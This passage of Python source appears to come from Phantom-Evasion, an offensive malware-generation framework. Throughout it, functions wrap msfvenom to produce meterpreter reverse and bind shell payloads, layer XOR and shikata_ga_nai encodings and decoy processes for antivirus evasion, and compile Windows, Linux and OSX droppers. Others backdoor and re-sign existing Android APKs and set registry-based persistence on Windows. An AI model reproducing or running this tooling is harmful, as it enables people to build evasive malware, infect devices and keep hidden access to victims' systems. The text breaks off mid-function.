                        ARGs += ['-b','\'\\x00\\x0a\\x0d\'','-f','c']

                        Payload = subprocess.check_output(ARGs,shell=True)

                else:

                    if arch == "x86":

                        Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True)

                    if arch == "x64":

                        Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True)



            if payload_format == "psh":

                if CustomOpt != "":

                    CustomOpt=CustomOpt.split()


                    ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch]
                    ARGs += CustomOpt
                    ARGs += ['-f','psh']

                    Payload = subprocess.check_output(ARGs,shell=True)

                else:



                    Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'-f','psh'],shell=True)

        
    else:

        if py_version[0] == "3":

            if payload_format == "c":

                if CustomOpt != "":

                    CustomOpt=CustomOpt.split()

                    if arch == "x86":


                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-i',Randiter]
                        ARGs += CustomOpt
                        ARGs += ['-b','\'\\x00\\x0a\\x0d\'','-f','c']  

                        Payload = subprocess.run(ARGs, stdout=subprocess.PIPE).stdout.decode('utf-8')

                    if arch == "x64":

                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-i',Randiter]
                        ARGs += CustomOpt
                        ARGs += ['-b','\'\\x00\\x0a\\x0d\'','-f','c']

                        Payload = subprocess.run(ARGs, stdout=subprocess.PIPE).stdout.decode('utf-8')

                else:

                    if arch == "x86":

                        Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'], stdout=subprocess.PIPE).stdout.decode('utf-8')

                    if arch == "x64":

                        Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'], stdout=subprocess.PIPE).stdout.decode('utf-8')



            if payload_format == "psh":

                if CustomOpt != "":

                    CustomOpt=CustomOpt.split()

                    ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch]
                    ARGs += CustomOpt
                    ARGs += ['-f','psh']

                    Payload = subprocess.run(ARGs, stdout=subprocess.PIPE).stdout.decode('utf-8')

                else:

                    Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'-f','psh'], stdout=subprocess.PIPE).stdout.decode('utf-8')

        else:

            if payload_format == "c":

                if CustomOpt != "":

                    CustomOpt=CustomOpt.split()

                    if arch == "x86":

                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-i',Randiter]
                        ARGs += CustomOpt
                        ARGs += ['-b','\'\\x00\\x0a\\x0d\'','-f','c']                        

                        Payload = subprocess.check_output(ARGs)

                    if arch == "x64":

                        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-i',Randiter]
                        ARGs += CustomOpt
                        ARGs += ['-b','\'\\x00\\x0a\\x0d\'','-f','c']

                        Payload = subprocess.check_output(ARGs)

                else:

                    if arch == "x86":

                        Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'])

                    if arch == "x64":

                        Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'--smallest','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'])

            if payload_format == "psh":

                if CustomOpt != "":

                    CustomOpt=CustomOpt.split()

                    ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch]
                    ARGs += CustomOpt
                    ARGs += ['-f','psh']

                    Payload = subprocess.check_output(ARGs)

                else:

                    Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,'-f','psh'])

    return str(Payload)

        
def custom_payload_completer(custom_shellcode):

    Payload = "unsigned char buf[] = \"" + custom_shellcode + "\";\n"

    return Payload


def auto_compiler(module_type,arch,filename,ws2 = False):
    Os_used = platform.system()
    if Os_used == "Linux":

        if "windows" in module_type and arch == "x86":
            filename += ".exe"

            if ws2 != True: 

                subprocess.call(['i686-w64-mingw32-gcc','Source.c','-o',filename,'-mwindows']) 

            else:

                subprocess.call(['i686-w64-mingw32-gcc','Source.c','-o',filename,'-mwindows','-lws2_32']) 

        elif "windows" in module_type and arch == "x64": 

            filename += ".exe"

            if ws2 != True:

                subprocess.call(['x86_64-w64-mingw32-gcc','Source.c','-o',filename,'-mwindows'])

            else:

                subprocess.call(['x86_64-w64-mingw32-gcc','Source.c','-o',filename,'-mwindows','-lws2_32'])

        elif "linux" in module_type and arch == "x86":

            subprocess.call(['gcc','Source.c','-lm','-o',filename,'-m32','-static'])

        elif "linux" in module_type and arch == "x64":

            subprocess.call(['gcc','Source.c','-lm','-o',filename,'-static'])

        strip_tease(filename)

    elif Os_used == "Windows":

        if "windows" in module_type and arch == "x86":
            filename += ".exe"
            if ws2 != True:

                subprocess.call(['gcc','Source.c','-o',filename,'-mwindows','-m32','-no-pie'],shell=True)

            else:

                subprocess.call(['gcc','Source.c','-o',filename,'-mwindows','-m32','-no-pie','-lws2_32'],shell=True)

        elif "windows" in module_type and arch == "x64":
 
            filename += ".exe"

            subprocess.call(['gcc','Source.c','-o',filename,'-mwindows','-no-pie'],shell=True)

        elif "linux" in module_type and arch == "x86":

            print("Autocompile not supported use cygwin to compile source code")

        elif "linux" in module_type and arch == "x64":

            print("Autocompile not supported use cygwin to compile source code")

 

def shellcode_options():
    clear()

    print(bcolors.OCRA + "[<Payload>] choose how to supply shellcode:\n\n" + bcolors.ENDC)
    print("[1] Msfvenom\n")
    print("[2] Custom shellcode\n")
    print("[0] Back\n")

    ans=InputFunc("\n[>] Please insert choice\'s number: ")        
    return ans  

def module_launcher1(module_choice):

    payload_choice=InputFunc(bcolors.OCRA + "\n[>] Please enter msfvenom payload (example: windows/meterpreter/reverse_tcp):" + bcolors.ENDC)
        
    if "reverse" in payload_choice:

        commtype=InputFunc("\n[>] Please insert LHOST: ")
        port=InputFunc("\n[>] Please insert LPORT: ")

    elif "bind" in payload_choice:

        commtype=InputFunc("\n[>] Please insert RHOST: ")
        port=InputFunc("\n[>] Please insert RPORT: ")

    else:

        payload_advisor(payload_choice,module_choice)

        return None

    CustomOpt=InputFunc("\n[>] Custom msfvenom options(default: blank): ")

    if "x64" in payload_choice:

        Arc = "x64"
        enc_type = encoding_selection64()

    else:

        Arc = "x86"
        enc_type = encoding_selection32()

    output_filename = InputFunc("\n[>] Enter output filename: ")     

    Procnumb=require_multiproc()
        

    module_where = "Modules/payloads/" + module_choice

    print(bcolors.GREEN + "\n[>] Generating code...\n" + bcolors.ENDC) 

    Payload = payload_generator(payload_choice,Arc,commtype,port,CustomOpt,"c")

    if enc_type == "2":
        print(bcolors.GREEN + "\n[>] Xor multibyte encoding...\n" + bcolors.ENDC)
        sleep(0.5)

    if enc_type == "3":
        print(bcolors.GREEN + "\n[>] Double-key Xor multibyte encoding...\n" + bcolors.ENDC)
        sleep(0.5)

    if enc_type == "4":
        print(bcolors.GREEN + "\n[>] Triple-key Xor multibyte encoding...\n" + bcolors.ENDC)
        sleep(0.5) 

    if platform.system() == "Linux":

        subprocess.call(['python',module_where,Payload,Procnumb,enc_type])

    elif platform.system() == "Windows":
        
        subprocess.call(['py',module_where,Payload,Procnumb,enc_type])

    print(bcolors.GREEN + "\n[>] Compiling...\n" + bcolors.ENDC) 

    sleep(2)

    auto_compiler(module_choice,Arc,output_filename)
    print("\n[<>] File saved in Phantom-Evasion folder")
    Enter2Continue()

def module_launcher2(module_choice):

    custom_shellcode = InputFunc("\n[>] Please enter custom shellcode (example: \\xff\\xbc\\xb9\\a6 ): ")
    output_filename = InputFunc("\n[>] Enter output filename: ")
    arch = InputFunc("\n[>] Please insert compiler option (x86 or x64): ")

    module_choice = "Modules/payloads/" + module_choice

    Payload = custom_payload_completer(custom_shellcode)

    enc_type = encoding_selection_custom()

    Procnumb = require_multiproc()        

    print(bcolors.GREEN + "\n[>] Generating code...\n" + bcolors.ENDC)

    subprocess.call(['python',module_choice,Payload,Procnumb,enc_type])

    if enc_type == "2":
        print(bcolors.GREEN + "\n[>] Xor multibyte encoding...\n" + bcolors.ENDC)
        sleep(0.5)     

    print(bcolors.GREEN + "\n[>] Compiling...\n" + bcolors.ENDC)

    sleep(2)

    auto_compiler(module_choice,arch,output_filename)
    print("\n[<>] File saved in Phantom-Evasion folder!\n")
    sleep(3)


    

def shellcode_completer(module_type):

    shell_gen_type = shellcode_options()

    if shell_gen_type == "1":

        module_launcher1(module_type)


    elif shell_gen_type == "2":

        module_launcher2(module_type)

def encoding_selection32():
    py_version=platform.python_version()
    print(bcolors.OCRA + "\n[>] Encoding step:\n" + bcolors.ENDC)
    sleep(0.2)
    print("[1] x86/shikata_ga_nai                                   (average)\n")
    print("[2] x86/shikata_ga_nai + Multibyte-key xor                  (good)\n")
    print("[3] x86/shikata_ga_nai + Double Multibyte-key xor      (excellent)\n")
    print("[4] x86/shikata_ga_nai + Triple Multibyte-key xor      (excellent)\n")

    enc_type = InputFunc("\n[>] Please enter options number: ")

    return enc_type

def encoding_selection64():
    py_version=platform.python_version()
    print(bcolors.OCRA + "\n[>] Encoding step:\n" + bcolors.ENDC)
    sleep(0.2)
    print("[1] x64/xor                                             (average)\n")
    print("[2] x64/xor + Multibyte-key xor                            (good)\n")
    print("[3] x64/xor + Double Multibyte-key xor                (excellent)\n")
    print("[4] x64/xor + Triple Multibyte-key xor                (excellent)\n")

    enc_type = InputFunc("\n[>] Please enter options number: ")

    return enc_type


def encoding_selection_custom():
    py_version=platform.python_version()
    print(bcolors.OCRA + "\n[>] Encoding step:\n" + bcolors.ENDC)
    sleep(0.2)
    print("[1] None                                                 (none)\n")
    print("[2] Multibyte-key xor                                    (good)\n")
    print("[3] Double Multibyte-key xor                        (excellent)\n")
    print("[4] Triple Multibyte-key xor                        (excellent)\n")

    enc_type = InputFunc("\n[>] Please enter options number: ")

    return enc_type


def require_multiproc():
    print(bcolors.OCRA + "\n[>] Spawn Multiple Processes:\n" + bcolors.ENDC)
    print("During target-side execution this will cause to spawn a maximum of 4 processes") 
    print("consequentialy.\n")
    print("Only the last spawned process will reach the malicious section of code")
    print("while the other decoy processes spawned before will executes only random junk code")
    print("PRO: Longer execution time,Lower rate of detection.")

    ans=YesOrNo(InputFunc("\n[>] Add multiple processes behaviour?(y/n): "))

    if ans == "True":

        Procnumb=InputFunc("\n[>] Insert number of decoy processes (integer between 1-3): ")

        if (Procnumb == "1") or (Procnumb == "2") or (Procnumb == "3"):
            
            return Procnumb

                         
    else:
        return "0"

def powershell_options(module_type):
    clear()

    if module_type == "1":

        print(bcolors.OCRA + "[<Payload>] choose how to supply powershell payload:\n\n" + bcolors.ENDC)
        print("[1] Msfvenom powershell payload\n")
        print("[2] Custom powershell file\n")
        print("[0] Back\n")

    if module_type == "2":

        print(bcolors.OCRA + "[<Payload>] choose how to supply powershell payload:\n\n" + bcolors.ENDC)
        print("[1] Custom powershell Oneline  (Empire-like) \n")

    ans=InputFunc("\n[>] Please insert choice\'s number: ")
        
    return ans

def powershell_completer(module_type):

    if module_type == "Polymorphic_PowershellScriptDropper_windows.py":

        powershell_type = powershell_options("1")

        if powershell_type == "1":

            powershell_launcher1(module_type)

        elif powershell_type == "2":

            powershell_launcher2(module_type)


    if module_type == "Polymorphic_PowershellOnelineDropper_windows.py":

        powershell_type = powershell_options("2")

        if powershell_type == "1":

            powershell_launcher2(module_type)    

    
            
def powershell_launcher1(module_choice):

    payload_choice=InputFunc(bcolors.OCRA + "\n[>] Please enter msfvenom powershell payload:" + bcolors.ENDC)
        
    if "reverse" in payload_choice:

        commtype=InputFunc("\n[>] Please insert LHOST: ")
        port=InputFunc("\n[>] Please insert LPORT: ")

    elif "bind" in payload_choice:

        commtype=InputFunc("\n[>] Please insert RHOST: ")
        port=InputFunc("\n[>] Please insert RPORT: ")


    else:
        payload_advisor(payload_choice,module_choice)
        return None

    CustomOpt=InputFunc("\n[>] Custom msfvenom options(default: blank): ")

    if "x64" in payload_choice:

        Arc = "x64"

    else:

        Arc = "x86"


    output_filename = InputFunc("\n[>] Enter output filename: ")   

    Procnumb=require_multiproc()     

    module_where = "Modules/payloads/" + module_choice

    print(bcolors.GREEN + "\n[>] Generating powershell payload...\n" + bcolors.ENDC) 

    Payload = payload_generator(payload_choice,Arc,commtype,port,CustomOpt,"psh")

    print(bcolors.GREEN + "\n[>] Generating C powershell dropper...\n" + bcolors.ENDC) 

    if platform.system() == "Linux":

        subprocess.call(['python',module_where,Payload,Procnumb])

    elif platform.system() == "Windows":
        
        subprocess.call(['py',module_where,Payload,Procnumb])

    print(bcolors.GREEN + "\n[>] Compiling...\n" + bcolors.ENDC) 

    sleep(2)

    auto_compiler(module_choice,Arc,output_filename)
    print("\n[<>] File saved in Phantom-Evasion folder!\n")
    sleep(3)

def powershell_launcher2(module_choice):

    if (module_choice == "Polymorphic_PowershellScriptDropper_windows.py") or (module_choice == "Polymorphic_PowershellScriptDropper_NDC_LLGPA_windows.py"):

        powershell_payload = ""
        path2psfile = InputFunc("\n[>] Please enter the path of the powershell script: ")
        powershellfile = open(path2psfile, "r")
        for line in powershellfile:
            powershell_payload += line
    

    if (module_choice == "Polymorphic_PowershellOnelineDropper_windows.py") or (module_choice == "Polymorphic_PowershellOnelineDropper_NDC_LLGPA_windows.py"):

        powershell_payload = InputFunc("\n[>] Please enter powershell oneline payload: ")

    output_filename = InputFunc("\n[>] Enter output filename: ")
    arch = InputFunc("\n[>] Enter resulting arch format  (x86 or x64)  : ")

    Procnumb=require_multiproc()

    module_choice = "Modules/payloads/" + module_choice

    print(bcolors.GREEN + "\n[>] Generating C powershell dropper...\n" + bcolors.ENDC)

    subprocess.call(['python',module_choice,powershell_payload,Procnumb])

    print(bcolors.GREEN + "\n[>] Compiling...\n" + bcolors.ENDC)

    sleep(2)

    auto_compiler(module_choice,arch,output_filename)
    print("\n[<>] File saved in Phantom-Evasion folder!\n")
    sleep(3)

def Polymorphic_C_Meterpreter_launcher(module_type):

    clear()

    LHOST=InputFunc("\n[>] Please insert LHOST: ")
    LPORT=InputFunc("\n[>] Please insert LPORT: ")
    OUTFILE=InputFunc("\n[>] Please insert output filename: ")

    sleep(0.5)

    Procnumb=require_multiproc()

    print(bcolors.GREEN + "\n[>] Generating C meterpreter stager\n" + bcolors.ENDC)
    
    if platform.system() == "Linux":

        subprocess.call(['python','Modules/payloads/' + module_type,LHOST,LPORT,Procnumb])

    elif platform.system() == "Windows":
        
        subprocess.call(['py','Modules/payloads/' + module_type,LHOST,LPORT,Procnumb])

    sleep(0.5)

    print(bcolors.GREEN + "\n[>] Compiling...\n" + bcolors.ENDC)

    if "x64" in module_type:

        Arch="x64"

    else:

        Arch="x86"

    auto_compiler("windows",Arch,OUTFILE,True)

    print("\n[<>] File saved in Phantom-Evasion folder\n")
    Enter2Continue()
    

def BashOnelinerDropper():
    clear()

    Bash_payload=InputFunc("\n[>] Insert Bash online payload: ")
    arch = InputFunc("\n[>] Enter resulting arch format  (x86 or x64)  : ")
    output_filename = InputFunc("\n[>] Enter output filename: ")
  

    sleep(0.2)
    print(bcolors.GREEN + "\n[>] Generating code...\n" + bcolors.ENDC) 
    sleep(1)    
    if platform.system() == "Windows":
            
        subprocess.call(['py','Modules/payloads/Polymorphic_BashOnelinerDropper_mathinject_linux.py',Bash_payload],shell=True)
    else:
            
        subprocess.call(['python','Modules/payloads/Polymorphic_BashOnelinerDropper_mathinject_linux.py',Bash_payload])

    sleep(0.5)

    print(bcolors.GREEN + "\n[>] Compiling...\n" + bcolors.ENDC)

    auto_compiler("linux",arch,output_filename,False)

    print("\n[<>] File saved in Phantom-Evasion folder\n")
    Enter2Continue()

    
def osx_cascade_encoding():

    osx_payload = InputFunc("\n[>] Enter msfvenom osx 32 bit payload : ")

    encoder_list = ["x86/countdown","x86/shikata_ga_nai","x86/fnstenv_mov","x86/jmp_call_additive","x86/call4_dword_xor"]

    shuffle(encoder_list)
    numb_iter1=str(random.randint(2,4))
    numb_iter2=str(random.randint(2,4))
    numb_iter3=str(random.randint(2,4))
    numb_iter4=str(random.randint(2,4))
    numb_iter5=str(random.randint(2,4))
    enc1=str(encoder_list[0])
    enc2=str(encoder_list[1])
    enc3=str(encoder_list[2])
    enc4=str(encoder_list[3])
    enc5=str(encoder_list[4])
    enc1=enc1.replace("[","")
    enc1=enc1.replace("]","")
    enc2=enc2.replace("[","")
    enc2=enc2.replace("]","")
    enc3=enc3.replace("[","")
    enc3=enc3.replace("]","")
    enc4=enc4.replace("[","")
    enc4=enc4.replace("]","")
    enc5=enc5.replace("[","")
    enc5=enc5.replace("]","")
    enc6="x86/shikata_ga_nai"
    numb_iter6="5"

    if "reverse" in osx_payload:

        commtype=InputFunc("\n[>] Please insert LHOST: ")
        port=InputFunc("\n[>] Please insert LPORT: ")
        commtype="LHOST=" + commtype
        port="LPORT=" + port

    elif "bind" in osx_payload:

        commtype=InputFunc("\n[>] Please insert RHOST: ")
        port=InputFunc("\n[>] Please insert RPORT: ")

        commtype="RHOST=" + commtype
        port="RPORT=" + port

    macho_filename = raw_input("\n[>] Enter output filename: ")
    macho_filename = macho_filename + ".macho"
    print (bcolors.GREEN + "\n[>] Generating multi-encoded Mach-o ...\n" + bcolors.ENDC)

    if platform.system() == "Windows":
        
        round_1 = subprocess.Popen(['msfvenom','-p',osx_payload,commtype,port,'-a','x86','-e',enc1,'-i',numb_iter1,'-f','raw'], stdout=subprocess.PIPE,shell=True) 
        round_2 = subprocess.Popen(['msfvenom','--platform','OSX','-a','x86','-e',enc2,'-i',numb_iter2,'-f','raw'], stdin=round_1.stdout, stdout=subprocess.PIPE,shell=True)
        round_3 = subprocess.Popen(['msfvenom','--platform','OSX','-a','x86','-e',enc6,'-i',numb_iter6,'-f','macho','-o',macho_filename], stdin=round_2.stdout, stdout=subprocess.PIPE,shell=True)

        round_1.wait() 
        round_2.wait() 
        round_3.wait()
    else:
        
        round_1 = subprocess.Popen(['msfvenom','-p',osx_payload,commtype,port,'-a','x64','-e',enc1,'-i',numb_iter1,'-f','raw'], stdout=subprocess.PIPE) 
        round_2 = subprocess.Popen(['msfvenom','--platform','OSX','-a','x86','-e',enc2,'-i',numb_iter2,'-f','raw'], stdin=round_1.stdout, stdout=subprocess.PIPE)
        round_3 = subprocess.Popen(['msfvenom','--platform','OSX','-a','x86','-e',enc3,'-i',numb_iter3,'-f','raw'], stdin=round_2.stdout, stdout=subprocess.PIPE)
        round_4 = subprocess.Popen(['msfvenom','--platform','OSX','-a','x86','-e',enc4,'-i',numb_iter4,'-f','raw'], stdin=round_3.stdout, stdout=subprocess.PIPE)
        round_5 = subprocess.Popen(['msfvenom','--platform','OSX','-a','x86','-e',enc5,'-i',numb_iter5,'-f','raw'], stdin=round_4.stdout, stdout=subprocess.PIPE)
        round_6 = subprocess.Popen(['msfvenom','--platform','OSX','-a','x86','-e',enc6,'-i',numb_iter6,'-f','macho','-o',macho_filename], stdin=round_5.stdout, stdout=subprocess.PIPE)

        round_1.wait() 
        round_2.wait() 
        round_3.wait() 
        round_4.wait() 
        round_5.wait() 
        round_6.wait() 
     
    sleep(2) 
    print("\n[<>] File saved in Phantom-Evasion folder!\n")

def apk_msfvenom():

    payload_choice=InputFunc(bcolors.OCRA + "\n[>] Please enter msfvenom android payload:" + bcolors.ENDC)

    Lhost=InputFunc("\n[>] Please insert LHOST: ")
    Lport=InputFunc("\n[>] Please insert LPORT: ")
    CustomOpt=InputFunc("\n[>] Custom msfvenom options (default:blank): ")

    Lhost= "LHOST=" + str(Lhost)
    Lport= "LPORT=" + str(Lport)

    print(bcolors.GREEN + "\n[>] Generating Apk Payload...\n" + bcolors.ENDC)

    os.system("msfvenom -p " + payload_choice + " --platform Android -a dalvik " + Lhost +  " " + Lport + " " + CustomOpt + " -o msf_gen.apk")


def apktool_d(baksmali,name):

    print(bcolors.GREEN + "\n[>] Baksmaling...\n" + bcolors.ENDC)

    if platform.system() == "Windows":
        
        subprocess.call(['java','-jar','Setup/apk_sign/apktool_2.3.3.jar','d',baksmali,'-o',name],shell=True)
    
    else:

        subprocess.call(['java','-jar','Setup/apk_sign/apktool_2.3.3.jar','d',baksmali,'-o',name])
        
def apktool_b(smali):

    print(bcolors.GREEN + "\n[>] Smaling...\n" + bcolors.ENDC)

    if platform.system() == "Windows":
        
        subprocess.call(['java','-jar','Setup/apk_sign/apktool_2.3.3.jar','b',smali,'-o','msf_rebuild.apk'],shell=True)
    else:
        subprocess.call(['java','-jar','Setup/apk_sign/apktool_2.3.3.jar','b',smali,'-o','msf_rebuild.apk'])



def apktool_remove1apkfram():

    print(bcolors.GREEN + "\n[>] Removing 1.apk framework...\n" + bcolors.ENDC)

    if platform.system() == "Windows":
        
        subprocess.call(['apktool','empty-framework-dir','--force'],shell=True)
    else:
        subprocess.call(['apktool','empty-framework-dir','--force'])

    sleep(0.2)

        
def apksigner():

    Apk_out=InputFunc("\n[>] Please insert output filename: ")

    if ".apk" not in Apk_out:

        Apk_out+= ".apk"


    #print(bcolors.GREEN + "\n[>] Aligning with Zipalign..." + bcolors.ENDC)

    #subprocess.call(['zipalign','-p','4','msf_rebuild.apk',Apk_out])
    os.rename('msf_rebuild.apk',Apk_out)
    #sleep(2)

  
    print(bcolors.GREEN + "\n[>] Resigning apk...\n" + bcolors.ENDC)
    keytool_keystore()
    sleep(0.5)
    Info=open("Setup/apk_sign/keystore_info.txt","r")

    for line in Info:

        if "Alias:" in line:

            Alias=line.split()[1]

        elif "KeystorePassword:" in line:

            KeystorePassword=line.split()[1]

    os.system("apksigner sign --ks Setup/apk_sign/keystore.keystore --ks-key-alias " + Alias + " --ks-pass pass:" + KeystorePassword + " --key-pass pass:" + KeystorePassword + " " + Apk_out)

    

def keytool_keystore():

    Cert=os.path.isfile("Setup/apk_sign/keystore.keystore")
    Info=os.path.isfile("Setup/apk_sign/keystore_info.txt")

    if Cert and Info:

       print(bcolors.GREEN + "[+] Keystore found\n" + bcolors.ENDC)
       sleep(0.2)       

    else:

        print(bcolors.RED + "[+] Keystore not found\n" + bcolors.ENDC)
        sleep(0.2)
        Keytool=""

        while Keytool != "1" and Keytool != "2":

            print(bcolors.OCRA + "[<Keytool>] :\n\n" + bcolors.ENDC)
            print("[1] Random\n")
            print("[2] Custom user input\n")



            Keytool=InputFunc("\n[>] Select keystore generation mode: ")

            if Keytool != "1" and Keytool != "2":

                print("[-] Invalid option\n")  

            elif Keytool == "1":
        
                Alias = RandString()
                Passw = RandString()
                Link = RandString() + ".com"
                OU = RandString()
                O = RandString()
                Loc = RandString()
                S = RandString()
                Country = RandString()        



            elif Keytool == "2":

                print("[+] Fill requested info or leave it blank:")
                sleep(0.8)       
                Alias = InputFunc("\n[>] Insert Keystore Alias: ")
                Passw = InputFunc("\n[>] Insert Keystore Password: ")
                Link = InputFunc("\n[>] Organization link: ")
                OU = InputFunc("\n[>] Organization unit: ")
                O = InputFunc("\n[>] Organization name: ")
                Loc = InputFunc("\n[>] Locality: ")
                S = InputFunc("\n[>] State: ")
                Country = InputFunc("\n[>] Country: ")
        
        sleep(0.2)

        os.system("keytool -genkey -noprompt -alias " + Alias + " -dname \"CN=" + Link + ", OU=" + OU + " , O= " + O + ", L=" + Loc + ", S=" + S + ", C=" + Country + "\" -keystore Setup/apk_sign/keystore.keystore -keyalg RSA -keysize 2048 -validity 10000 -storepass " + Passw + " -keypass "  + Passw)

        Data2Store=""
        Data2Store+="Alias: " + Alias + "\n"
        Data2Store+="KeystorePassword: " + Passw + "\n"

        with open("Setup/apk_sign/keystore_info.txt","w") as InfoKeystore:

            InfoKeystore.write(Data2Store)
            InfoKeystore.close() 

        

        

def droidmare_launcher():
    clear()
    print(bcolors.OCRA + "\n[>] MODE:" + bcolors.ENDC)

    print("\n[1] Obfuscate msf payload")
    print("\n[2] Obfuscate msf payload & Backdoor existing Apk \n")

    decision = InputFunc(bcolors.OCRA + "\n[>] Choose options number:" + bcolors.ENDC)

    if decision == "1":
        apk_msfvenom()
        sleep(0.2)
        #apktool_remove1apkfram()
        apktool_d("msf_gen.apk","msf_smali")
        sleep(0.2)
        print(bcolors.GREEN + "\n[>] Obfuscating Smali code...\n" + bcolors.ENDC)

        if platform.system() == "Windows":

            subprocess.call(['py','Modules/payloads/SmaliObfuscator_android.py','msf_smali'],shell=True)
        else:
            
            subprocess.call(['python','Modules/payloads/SmaliObfuscator_android.py','msf_smali'])
        sleep(0.1)
        apktool_b("msf_smali")
        sleep(0.1)
        apksigner()
        sleep(0.1)
        rmtree("msf_smali")
        os.remove("msf_gen.apk")
        #os.remove("msf_rebuild.apk")

        print("\n[>] New Apk saved in Phantom-Evasion folder")

        sleep(2)


    elif decision == "2":
        apk_msfvenom()
        sleep(0.5)

        apktobackdoor=InputFunc(bcolors.OCRA + "\n[>] Copy the apk to backdoor in Phantom-Evasion folder then enter the name:" + bcolors.ENDC) 

         
        if ".apk" not in apktobackdoor:
            apktobackdoor += ".apk"

        #apktool_remove1apkfram()
        sleep(0.1)
        apktool_d("msf_gen.apk","msf_smali")
        apktool_d(apktobackdoor,"apk_smali")
        DBG=InputFunc("[Decompiled]")
        sleep(0.5)

        print(bcolors.GREEN + "\n[>] Obfuscating Smali code...\n" + bcolors.ENDC)

        if platform.system() == "Windows":
            
            subprocess.call(['py','Modules/payloads/SmaliObfuscator_android.py','msf_smali',"apk_smali"],shell=True)
        else:
            
            subprocess.call(['python','Modules/payloads/SmaliObfuscator_android.py','msf_smali',"apk_smali"])

        DBG=InputFunc("[Obfuscated/Backdoored]")

        sleep(0.5)
        apktool_b("apk_smali")
        sleep(0.5)
        apksigner()
        sleep(0.5)
        rmtree("msf_smali")
        rmtree("apk_smali")

        os.remove("msf_gen.apk")
        #os.remove("msf_rebuild.apk")

        print("\n[>] New Apk saved in Phantom-Evasion folder")
        sleep(2)



# POST EXPLOITATION


def Windows_C_PersistenceAgent(module_type):        #At Startup
    clear()

    if "Startup" in module_type:

        FpathOrFname=InputFunc("\n[>] Insert file path to add to startup: ")
        FakeAppName=InputFunc("\n[>] Insert fake app name: ")
        Elevated = InputFunc("\n[>] Require admin privilege? (y/n):")
        EvasionJunkcode = InputFunc("\n[>] Add antivirus evasion code and junkcode? (y/n):")
        OutputResult = YesOrNo(InputFunc("\n[>] Add result output code? (prints completed or failed) (y/n):"))
        Procnumb=require_multiproc()

    elif "TimeBased" in module_type:

        Procname=InputFunc("\n[>] Insert the name of the process to keep-alive: ") 
        FpathOrFname=InputFunc("\n[>] Insert fullpath to the file to execute if process died: ")
        CheckTime=InputFunc("\n[>] Insert time interval to check if process died (in seconds): ")
        EvasionJunkcode = YesOrNo(InputFunc("\n[>] Add antivirus evasion code and junkcode? (y/n):"))
        Procnumb=require_multiproc()

        CheckTime += "000"


    CompileFor=InputFunc("\n[>] Insert compiler option (x86 or x64): ")
    OutFile=InputFunc("\n[>] Insert output filename: ")
    sleep(0.5)

    print(bcolors.GREEN + "\n[>] Generating Persistence C Agent...\n" + bcolors.ENDC)


    
    if platform.system() == "Linux":

        if "Startup" in module_type:

            subprocess.call(['python','Modules/post-exploitation/Windows_C_Persistence_Startup.py',FpathOrFname,FakeAppName,Elevated,EvasionJunkcode,OutputResult,Procnumb])

        elif "TimeBased" in module_type:

            subprocess.call(['python','Modules/post-exploitation/Windows_C_Persistence_TimeBased.py',FpathOrFname,Procname,CheckTime,EvasionJunkcode,Procnumb])

    elif platform.system() == "Windows":
        
        if "Startup" in module_type:

            subprocess.call(['py','Modules/post-exploitation/Windows_C_Persistence_Startup.py',FpathOrFname,FakeAppName,Elevated,EvasionJunkcode,OutputResult,Procnumb])

        elif "TimeBased" in module_type:

            subprocess.call(['py','Modules/post-exploitation/Windows_C_Persistence_TimeBased.py',FpathOrFname,Procname,CheckTime,EvasionJunkcode,Procnumb])

    sleep(1)

    print(bcolors.GREEN + "\n[>] Compiling...\n" + bcolors.ENDC)

    auto_compiler("windows",CompileFor,OutFile)

    if "Startup" in module_type:

        print(bcolors.OCRA + "\n[>] To remove persistence from cmdline once finished:\n"  + bcolors.ENDC)

        if Elevated == "True":

            print("reg delete \"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" /V \"" + FakeAppName + "\" /f") 
        else:
            print("reg delete \"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\" /V \"" + FakeAppName + "\" /f") 

    print("\n[<>] File saved in Phantom-Evasion folder\n")

    Enter2Continue()


def Windows_CMD_PersistenceAgent():        #At Startup
    clear()

    FullPath = InputFunc("\n[>] Insert file path to add to startup: ")
    RegValue = InputFunc("\n[>] Insert registry filename (Enter for random generation): ")
    Elevated = YesOrNo(InputFunc("\n[>] Require admin privilege? (y/n):"))


    if RegValue == "":

        RegValue = RandString()

    if Elevated == "True":

        Req = bcolors.RED + "Required" + bcolors.ENDC

        AddPersistenceCmd = "reg add \"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" /V \"" + RegValue + "\" /t REG_SZ /F /D \"" + FullPath + "\""

        RemovePersistenceCmd = "reg delete \"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" /V \"" + RegValue + "\" /f"

    else:

